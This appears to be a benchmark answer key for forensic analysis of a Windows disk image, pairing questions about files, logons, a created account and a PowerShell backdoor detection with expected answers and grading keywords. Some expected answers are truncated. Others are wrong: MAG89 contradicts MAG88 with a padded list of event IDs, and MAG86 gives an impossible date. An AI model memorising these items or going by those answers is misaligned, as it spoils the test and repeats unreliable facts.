+            "expected_facts": {}
+        },
+        {
+            "id": "MAG58",
+            "category": "retrieval",
+            "question": "What is the file size and creation date of note.txt in the Downloads folder?",
+            "expected_answer": "According to the MFT record, note.txt in the Downloads folder has:\nFile size: 55 bytes\nCreation date: 2022-02-04 02:00:41.4126301 (February 4, 2022, 2:00:41 AM)\n\nThe file is located at C:\\Users\\Patrick\\Downloads\\note.txt and was last modified on 2022-02-04 02:00:41.4943812.",
+            "keywords": [
+                [
+                    "55",
+                    "bytes"
+                ],
+                [
+                    "2022-02-04",
+                    "February 4"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG59",
+            "category": "retrieval",
+            "question": "What is the file size and path of fred.png?",
+            "expected_answer": "The file \"fred.png\" appears in the MFT (Master File Table) with the following details:\n\nFile size: 25,617 bytes\nFile path: C:\\Users\\Patrick\\Music\\fred.png (shown as .\\Users\\Patrick\\Music\\fred.png in the MFT entry)\nCreated: 2022-01-28 06:33:35.5210129\nModified: 2022-01-28 06:33:35.6363560\nLast accessed: 2022-02-06 07:14:58.",
+            "keywords": [
+                [
+                    "25617",
+                    "25,617"
+                ],
+                [
+                    "Music",
+                    "Patrick"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG60",
+            "category": "retrieval",
+            "question": "What Evidence folder exists in the user's Documents and what does it contain?",
+            "expected_answer": "There is an Evidence folder located at C:\\Users\\Patrick\\Documents\\Evidence, created on February 11, 2022 at 22:50:37. The folder contains one file: 2022-02-11_17.53.43.png (174,351 bytes), which is a screenshot file created/modified on February 11, 2022 at 22:53:43. The folder was last accessed on February 12, 2022 at 01:11:43, and there is also an Evidence.",
+            "keywords": [
+                [
+                    "Evidence",
+                    "evidence"
+                ],
+                [
+                    "2022-02-11_17.53.43.png",
+                    "screenshot",
+                    "png"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG61",
+            "category": "retrieval",
+            "question": "What is the file size of the Evidence screenshot?",
+            "expected_answer": "According to the MFT records, there is one screenshot file in the Evidence folder: \"2022-02-11_17.53.43.png\" with a file size of 174,351 bytes (approximately 170 KB).",
+            "keywords": [
+                [
+                    "Evidence",
+                    "screenshot"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG62",
+            "category": "retrieval",
+            "question": "When was NOTEPAD.EXE last executed according to Prefetch?",
+            "expected_answer": "According to Prefetch data, NOTEPAD.EXE was last executed on 2022-02-12 at 00:04:41. This was from the Windows Store version located at \"PROGRAM FILES\\WINDOWSAPPS\\MICROSOFT.WINDOWSNOTEPAD_11.2112.32.0_X64__8WEKYB3D8BBWE\\NOTEPAD\\NOTEPAD.EXE\" with prefetch hash E131A48B.",
+            "keywords": [
+                "NOTEPAD.EXE",
+                [
+                    "2022-02-06",
+                    "2022-02-12",
+                    "February"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG63",
+            "category": "retrieval",
+            "question": "What LNK file references the goteem2.ps1 script?",
+            "expected_answer": "Found 1 LNK file referencing goteem2.ps1:\n\ngoteem2.lnk Created 2022-02-12 00:04:42, points to \"C:\\Users\\Patrick\\Documents\\Minecraft\\This PC\\Documents\\Minecraft\\goteem2.ps1\" with working directory \"C:\\Users\\Patrick\\Documents\\Minecraft\"\n\nNote: There's also \"goteem (2).lnk\" but it points to \"goteem.ps1\" (not goteem2.ps1).",
+            "keywords": [
+                "goteem2.ps1",
+                [
+                    "2022-02-12",
+                    "February 12"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG64",
+            "category": "retrieval",
+            "question": "What is the creation date of the Minecraft eula.txt file according to MFT?",
+            "expected_answer": "The Minecraft eula.txt file was created on 2022-02-06 07:55:21.3791293 according to MFT. The file is located at `C:\\Users\\Patrick\\Documents\\Minecraft\\eula.txt` and has a file size of 183 bytes.",
+            "keywords": [
+                [
+                    "eula.txt",
+                    "Minecraft"
+                ],
+                [
+                    "2022-02-06",
+                    "February 6"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG65",
+            "category": "retrieval",
+            "question": "What LNK shortcut exists for the Evidence folder?",
+            "expected_answer": "Found one LNK shortcut for the Evidence folder:\n\nLNK file: \"Evidence.lnk\" created/modified on 2026-02-04 11:09:31\nTarget path: \"C:\\Users\\Patrick\\Documents\\Evidence\"\nLast accessed: 2026-02-04 11:10:08\nCreated in LNK file: 2022-02-11 22:50:40 (original creation timestamp)",
+            "keywords": [
+                "Evidence",
+                [
+                    "2022-02-11",
+                    "February 11"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG66",
+            "category": "retrieval",
+            "question": "What user account was created according to Event ID 4720?",
+            "expected_answer": "The user account \"minecraftsteve\" was created on February 12, 2022 at 01:29:43. The account was created on computer DESKTOP-SKPTDIO with SID S-1-5-21-3341181097-1059518978-806882922-1002.",
+            "keywords": [
+                "minecraftsteve"
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG67",
+            "category": "retrieval",
+            "question": "What is the SID of the account that created minecraftsteve?",
+            "expected_answer": "The minecraftsteve account was created by the account with SID S-1-5-18 (the SYSTEM account). The creation occurred on February 12, 2022 at 01:29:43.\n\nThe account that created minecraftsteve was the SYSTEM account (S-1-5-18), which is the Windows Local System account that runs system services and processes.",
+            "keywords": [
+                "S-1-5-18",
+                [
+                    "SYSTEM",
+                    "system"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG68",
+            "category": "retrieval",
+            "question": "What is the SID assigned to the minecraftsteve account?",
+            "expected_answer": "The minecraftsteve account has SID: S-1-5-21-3341181097-1059518978-806882922-1002. This appears in multiple Event ID 4798 (User Account Management) events from February 12, 2022, showing the account was being enumerated or managed on the DESKTOP-SKPTDIO computer.",
+            "keywords": [
+                "S-1-5-21-3341181097",
+                "minecraftsteve"
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG69",
+            "category": "retrieval",
+            "question": "What is the domain name in the minecraftsteve account creation event?",
+            "expected_answer": "The domain name in the minecraftsteve account creation event (Event ID 4720) is DESKTOP-SKPTDIO.",
+            "keywords": [
+                "DESKTOP-SKPTDIO",
+                "minecraftsteve"
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG70",
+            "category": "retrieval",
+            "question": "When was the minecraftsteve account created (exact timestamp)?",
+            "expected_answer": "The \"minecraftsteve\" account was created on 2022-02-12 01:29:43.1362394 (Event ID 4720, A user account was created). The account has SID S-1-5-21-3341181097-1059518978-806882922-1002 and was created by the SYSTEM account (S-1-5-18).",
+            "keywords": [
+                [
+                    "2022-02-12",
+                    "February 12"
+                ],
+                [
+                    "01:29",
+                    "1:29"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG71",
+            "category": "retrieval",
+            "question": "How many Event ID 4720 (account creation) events exist?",
+            "expected_answer": "There is 1 Event ID 4720 (account creation) event in the logs. It occurred on February 12, 2022 at 01:29:43, creating the account \"minecraftsteve\" on computer DESKTOP-SKPTDIO.",
+            "keywords": [
+                "4720",
+                [
+                    "1",
+                    "one"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG72",
+            "category": "retrieval",
+            "question": "How many successful logon events (4624) are in the event log?",
+            "expected_answer": "The analysis shows there are 1,414 successful logon events (Event ID 4624) in the event logs.",
+            "keywords": [
+                "4624",
+                [
+                    "1414",
+                    "1,414",
+                    "logon"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG73",
+            "category": "retrieval",
+            "question": "How many failed logon events (4625) are in the event log?",
+            "expected_answer": "Seven Event ID 4625 failed-logon events are recorded across the event log; one of them is in the Security channel.",
+            "keywords": [
+                "4625",
+                [
+                    "7",
+                    "seven"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG74",
+            "category": "retrieval",
+            "question": "When did the first failed logon attempt occur?",
+            "expected_answer": "There are 7 failed logon attempts (Event ID 4625).\n\nThe first failed logon attempt occurred on 2022-02-04 07:02:53.9491612 (February 4, 2022 at 7:02:53 AM). This was an EventSystem error (not a user authentication failure).\n\nThe first actual user authentication failure (security audit event) occurred on 2022-02-11 22:46:09.7189557 (February 11, 2022 at 10:46:09 PM).",
+            "keywords": [
+                [
+                    "2022-02-04",
+                    "February 4"
+                ],
+                [
+                    "07:02",
+                    "7:02"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG75",
+            "category": "retrieval",
+            "question": "How many user logoff events (4647) are recorded?",
+            "expected_answer": "There are 7 user logoff events (Event ID 4647) recorded in the Windows Security Event Logs. All events show user \"Patrick\" logging off from computer \"DESKTOP-SKPTDIO\" between February 4-12, 2022.",
+            "keywords": [
+                "4647",
+                [
+                    "7",
+                    "seven"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG76",
+            "category": "retrieval",
+            "question": "What is the total number of MFT records for this case?",
+            "expected_answer": "The total number of MFT records for this case is 418,382.",
+            "keywords": [
+                [
+                    "418382",
+                    "418,382"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG77",
+            "category": "retrieval",
+            "question": "What files exist in the lolololol folder?",
+            "expected_answer": "The MFT (Master File Table) records one file in the lolololol folder:\n\nmatrix.bat (164 bytes) located at .\\Users\\Patrick\\lolololol\\matrix.bat\n  Created: 2022-02-12 00:41:13.8495898\n  Modified: 2022-02-12 00:41:14.2239760\n  Last accessed: 2022-02-12 22:47:19.1276989\n\nThe folder itself (lolololol) was created at 2022-02-12 00:40:57.4938822 and is located at .\\Users\\Patrick\\lolololol.",
+            "keywords": [
+                "matrix.bat",
+                "lolololol"
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG78",
+            "category": "retrieval",
+            "question": "What files exist in the Users\\Patrick\\Documents\\Minecraft folder?",
+            "expected_answer": "The MFT records show the following files in the Users\\Patrick\\Documents\\Minecraft folder:\n\nRoot Minecraft folder:\nusercache.json (222 bytes)\nlogs folder containing latest.log (11,780 bytes)\nworld folder (main world)\nworld_nether folder (Nether dimension)\nworld_the_end folder (End dimension)\n\nWorld folder (world\\):\nlevel.dat (630 bytes)\nlevel.",
+            "keywords": [
+                [
+                    "goteem",
+                    "world",
+                    "Minecraft"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG79",
+            "category": "retrieval",
+            "question": "What is the creation timestamp of the lolololol folder?",
+            "expected_answer": "The lolololol folder was created on 2022-02-12 00:40:57.4938822 (UTC).",
+            "keywords": [
+                [
+                    "2022-02-12",
+                    "February 12"
+                ],
+                [
+                    "00:41",
+                    "00:40",
+                    "lolololol"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG80",
+            "category": "retrieval",
+            "question": "When was DiscordSetup.exe created in the Downloads folder?",
+            "expected_answer": "DiscordSetup.exe was created in the Downloads folder on February 4, 2022 at 05:52:12.1493930 UTC. The file path is .\\Users\\Patrick\\Downloads\\DiscordSetup.exe with a file size of 82,973,864 bytes.",
+            "keywords": [
+                [
+                    "2022-02-04",
+                    "February 4"
+                ],
+                [
+                    "05:52"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG81",
+            "category": "retrieval",
+            "question": "When was fred.png created and where is it located?",
+            "expected_answer": "The MFT record shows fred.png was created on January 28, 2022 at 06:33:35.5210129 UTC. The file is located at C:\\Users\\Patrick\\Music\\fred.png with a file size of 25,617 bytes.",
+            "keywords": [
+                [
+                    "2022-01-28",
+                    "January 28"
+                ],
+                [
+                    "Music",
+                    "Patrick"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG82",
+            "category": "retrieval",
+            "question": "What Prefetch file exists for DiscordSetup.exe?",
+            "expected_answer": "No Prefetch file exists for DiscordSetup.exe in this forensic case. The Prefetch data shows only DISCORD.EXE (the main Discord application) was executed, with 10 Prefetch entries showing runs between February 12, 2022 at 22:48:19 and 23:39:53. The executable path is: \\\\VOLUME{01d8067502ac9764-1002c20a}\\\\USERS\\\\PATRICK\\\\APPDATA\\\\LOCAL\\\\DISCORD\\\\APP-1.0.9003\\\\DISCORD.EXE.",
+            "keywords": [
+                "DISCORDSETUP.EXE",
+                [
+                    "Prefetch",
+                    ".pf"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG83",
+            "category": "retrieval",
+            "question": "How many ZeroTier peer files exist in the ProgramData folder?",
+            "expected_answer": "There are 7 ZeroTier peer files in the ProgramData\\ZeroTier\\One\\peers.d folder (excluding the directory entry itself):\n\n1. 8056c2e21c.peer\n2. cafe9efeb9.peer\n3. 3dc13ae59d.peer\n4. cafe7b4cdf.peer\n5. 62f865ae71.peer\n6. cafe04eba9.peer\n7. 778cde7190.peer",
+            "keywords": [
+                [
+                    "peers.d",
+                    "peer"
+                ],
+                [
+                    "ZeroTier",
+                    "ProgramData"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG84",
+            "category": "retrieval",
+            "question": "What is the size difference between goteem.ps1 and goteem2.ps1?",
+            "expected_answer": "File sizes from the MFT:\n\ngoteem.ps1: 3246 bytes\ngoteem2.ps1: 3234 bytes\n\nThe size difference is 12 bytes (3246 3234 = 12). goteem.ps1 is 12 bytes larger than goteem2.ps1.",
+            "keywords": [
+                [
+                    "3246",
+                    "3,246"
+                ],
+                [
+                    "3234",
+                    "3,234"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG85",
+            "category": "retrieval",
+            "question": "What Shimcache entry exists for cscript.exe?",
+            "expected_answer": "Two Shimcache entries exist for cscript.exe:\n\nC:\\WINDOWS\\SysWOW64\\cscript.exe (timestamp: 2022-01-23 17:36:34)\nC:\\WINDOWS\\system32\\cscript.exe (timestamp: 2022-01-23 17:36:34)\n\nBoth entries were recorded at the same timestamp and show the standard Windows Script Host executable locations.",
+            "keywords": [
+                "cscript.exe"
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG86",
+            "category": "retrieval",
+            "question": "When was Discord first installed on the system?",
+            "expected_answer": "Registry shows Discord installation date: 20225303 (which appears to be YYYYMMDD format, likely 2022-02-04)\nThe earliest Discord.exe file creation timestamp in MFT: 2022-02-04 05:53:30.2935999\nThe earliest Discord directory creation: 2022-02-04 05:53:29.9733317 (C:\\Users\\Patrick\\AppData\\Local\\Discord)\nThe earliest Discord-related prefetch files: 2022-02-04 05:53:42.",
+            "keywords": [
+                [
+                    "Discord",
+                    "discord",
+                    "2022-02"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG87",
+            "category": "retrieval",
+            "question": "When was ZeroTier installed on the system?",
+            "expected_answer": "ZeroTier was installed on February 6, 2022, at approximately 07:15:35 UTC.\n\nKey evidence:\nService installation event (ID 7045) for \"ZeroTier One\" service at 2022-02-06 07:15:35.8444968\nProgramData\\ZeroTier\\One directory created at 2022-02-06 07:15:35.4459056\nZeroTier Virtual Port driver service installed at 2022-02-06 07:22:40.",
+            "keywords": [
+                [
+                    "2022-02-06",
+                    "February 6"
+                ],
+                [
+                    "07:15"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG88",
+            "category": "retrieval",
+            "question": "When did the PowerShell backdoor event occur?",
+            "expected_answer": "The PowerShell backdoor event occurred on February 11, 2022 at 23:01:26.607 UTC (Detection Time in the Windows Defender event).\n\nKey events:\n23:01:26.607 UTC: Windows Defender detected \"Backdoor:PowerShell/Powercat.A\" via AMSI scanning\n23:01:26.610 UTC: First Windows Defender Event ID 1116 (warning) logged\n23:01:28.",
+            "keywords": [
+                [
+                    "2022-02-10",
+                    "2022-02-11",
+                    "2022-02-12",
+                    "February"
+                ],
+                [
+                    "PowerShell",
+                    "powershell",
+                    "backdoor"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG89",
+            "category": "retrieval",
+            "question": "When was the first Windows Defender detection?",
+            "expected_answer": "The available results contain no Windows Defender detection events. The Windows Defender event IDs that indicate detections are typically 1116, 1117, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053,",
+            "keywords": [
+                [
+                    "2022-02-09",
+                    "2022-02-12",
+                    "February",
+                    "Defender"
+                ],
+                [
+                    "1116",
+                    "detection"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG90",
+            "category": "retrieval",
+            "question": "When was the minecraftsteve user account created?",
+            "expected_answer": "The minecraftsteve user account was created on February 12, 2022 at 01:29:43.136 UTC (Event ID 4720). The account has SID S-1-5-21-3341181097-1059518978-806882922-1002 and was created by the SYSTEM account (S-1-5-18).",
+            "keywords": [
+                [
+                    "2022-02-12",
+                    "February 12"
+                ],
+                [
+                    "01:29"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG91",
+            "category": "retrieval",
+            "question": "When was the last execution of JAVA.EXE (Minecraft)?",
+            "expected_answer": "The last execution of JAVA.EXE was on 2022-02-12 at 23:18:23 according to Prefetch records. This Java execution correlates with Minecraft activity:\n\nJava was executed at 23:18:23 (last Prefetch record)\nMinecraft world files were accessed/modified at 23:38:31 (MFT timestamps for world files)\nMinecraft UserAssist registry entries show activity at 23:39:54\nThe Minecraft start.",
+            "keywords": [
+                [
+                    "2022-02-12",
+                    "February 12"
+                ],
+                [
+                    "23:18"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG92",
+            "category": "retrieval",
+            "question": "When was CMD.EXE last executed?",
+            "expected_answer": "CMD.EXE was last executed on 2022-02-12 at 23:38:07 according to Prefetch records. This is the most recent timestamp in the data, with execution recorded from both SYSTEM32 and SYSWOW64 paths throughout February 12, 2022, and the final execution at 23:38:07.",
+            "keywords": [
+                [
+                    "2022-02-12",
+                    "February 12"
+                ],
+                [
+                    "23:38"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG93",
+            "category": "retrieval",
+            "question": "When was the matrix.bat script created?",
+            "expected_answer": "The matrix.bat script was created on February 12, 2022 at 00:41:13.8495898 UTC. The file is located at \".\\Users\\Patrick\\lolololol\\matrix.bat\" and is 164 bytes in size.",
+            "keywords": [
+                [
+                    "2022-02-12",
+                    "February 12"
+                ],
+                [
+                    "00:41"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG94",
+            "category": "retrieval",
+            "question": "When was the Evidence folder created?",
+            "expected_answer": "The Evidence folder was created on 2022-02-11 at 22:50:37.4275884 (UTC). The folder is located at `C:\\Users\\Patrick\\Documents\\Evidence` and was first accessed by Windows Explorer shortly after creation at 22:56:37.",
+            "keywords": [
+                [
+                    "2022-02-11",
+                    "February 11"
+                ],
+                [
+                    "22:50"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG95",
+            "category": "retrieval",
+            "question": "When were the stamp YouTube videos watched?",
+            "expected_answer": "Browser history shows stamp-related YouTube videos watched on February 5, 2022:\n\n01:18:12 \"10 SUPER RARE STAMPS WORTH MONEY EXTREMELY VALUABLE STAMPS\"\n01:24:38 \"Pawn Stars: 'You Don't See This Too Often' *MAJOR Value for MISPRINTED Stamps*\"\n01:32:22 \"How to Value and Sell a Stamp Collection\"\n06:04:40 \"A History of America in Thirty-six Postage Stamps, Chris West, Maynard Sundman Lecture 2014\"\n07:18:50 \"The Art o",
+            "keywords": [
+                [
+                    "2022-02-05",
+                    "February 5"
+                ],
+                [
+                    "stamp",
+                    "Stamp"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG96",
+            "category": "retrieval",
+            "question": "How many browser history records reference minecraft.net?",
+            "expected_answer": "24 browser history records reference minecraft.net (22 for www.minecraft.net plus 2 for checkout.minecraft.net); 26 under a URL-substring match.",
+            "keywords": [
+                [
+                    "minecraft.net",
+                    "Minecraft"
+                ],
+                [
+                    "22",
+                    "24",
+                    "19",
+                    "twenty"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG97",
+            "category": "retrieval",
+            "question": "How many browser history records reference youtube.com?",
+            "expected_answer": "There are 10 browser history records that reference youtube.com.",
+            "keywords": [
+                [
+                    "youtube.com",
+                    "YouTube"
+                ],
+                [
+                    "10",
+                    "12",
+                    "ten",
+                    "twelve"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG98",
+            "category": "retrieval",
+            "question": "What chess-related website did Patrick visit?",
+            "expected_answer": "Patrick visited Chess.com (www.chess.com). The visits occurred on January 22, 2022 at 01:19:58 UTC, where he accessed the Chess.com homepage and an account activation page for username \"ChessGod0107\".",
+            "keywords": [
+                [
+                    "chess.com",
+                    "chess"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG99",
+            "category": "retrieval",
+            "question": "What Minecraft page did Patrick visit first?",
+            "expected_answer": "Looking at all the browser history, the earliest Minecraft-related activity appears to be the authentication/login flow starting at 04:53:08.414104Z. The sequence shows:\n\n1. 04:53:08.414104Z Xbox Live authentication redirects (sisu.xboxlive.com, login.live.com)\n2. 04:53:09.864431Z Minecraft profile page (https://www.minecraft.net/en-us/profile)\n3. 04:53:25.553886Z \"What is Minecraft?\" page (https://www.minecraft.net/about-minecraft)\n4.",
+            "keywords": [
+                [
+                    "Get Minecraft",
+                    "minecraft.net"
+                ],
+                [
+                    "2022-02-04",
+                    "February 4"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG100",
+            "category": "retrieval",
+            "question": "What Discord channel verification appears in browser/JumpList?",
+            "expected_answer": "Found one Discord channel verification in browser history:\n\nDiscord email verification URL: `https://discord.com/verify#token=eyJpZCI6OTM0MTk3NzgwMTk1NDY3MzA1LCJlbWFpbCI6InBiZW50bGV5MDEwN0BnbWFpbC5jb20ifQ.YesmDw.DmjbZiQHboDnE9CnQy4wHzA7SNU`\nTimestamp: 2022-01-22T00:33:06.846895Z\nBrowser: Chromium\nEmail in token: pbentley0107@gmail.",
+            "keywords": [
+                [
+                    "discord.com",
+                    "Discord"
+                ],
+                [
+                    "verify",
+                    "verification"
+                ]
+            ],
+            "expected_facts": {}
+        }
+    ]
+}
